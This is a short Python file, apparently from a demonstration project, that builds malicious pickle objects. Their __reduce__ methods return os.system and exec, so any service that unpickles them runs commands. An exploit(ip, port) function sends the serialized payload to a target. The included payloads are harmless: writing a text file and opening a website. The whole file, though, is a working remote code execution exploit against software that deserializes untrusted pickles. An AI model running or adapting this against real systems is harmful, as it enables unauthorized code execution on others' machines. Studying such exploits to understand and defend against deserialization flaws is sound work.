from src.exploit.pickle import PickleExploit


class RCE(object):
	def __reduce__(self):
		raise NotImplementedError


class PayloadFile(RCE):
	def __reduce__(self):
		cmd = "echo Hello World! I'm inside > payload.txt & payload.txt"
		import os
		return os.system, (cmd,)


class PayloadSite(RCE):
	def __reduce__(self):
		return exec, ("import webbrowser; webbrowser.open('http://milliondollarhomepage.com')",)


def payload():
	return PickleExploit.get_pickle_file(PayloadFile())


def exploit(ip, port):
	bytes_payload = PickleExploit.dump_with_encode(PayloadSite())
	return PickleExploit.run_exploit(payload=bytes_payload, ip=ip, port=port)
